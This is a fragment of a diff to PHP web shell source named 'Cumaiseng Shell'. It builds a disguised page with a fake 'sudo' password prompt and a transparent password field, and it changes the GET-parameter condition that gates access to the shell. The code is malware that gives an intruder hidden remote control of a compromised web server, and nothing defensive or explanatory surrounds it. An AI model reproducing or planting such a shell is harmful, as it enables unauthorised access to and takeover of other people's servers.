@@ -17,7 +17,7 @@ $cumaiseng ="<html><head><title> Cumaiseng Shell</title><link rel='shortcut icon
 $cumaiseng.="<font color=green>cumaiseng@".$_SERVER['HTTP_HOST']." :~$ sudo su</font>";
 $cumaiseng.="<form method='POST'><label for='pass'><font color=green>[ sudo ] password for cumaiseng: </label><input type='password' name='pass' style='border:0;color:transparent;width:120px;background-color:transparent;'></form>";
 $cumaiseng.="</html>";   
-if($_GET['k']=="php"){
+if(empty($_GET['pal'])=="kon"){
 echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html>
 <head>
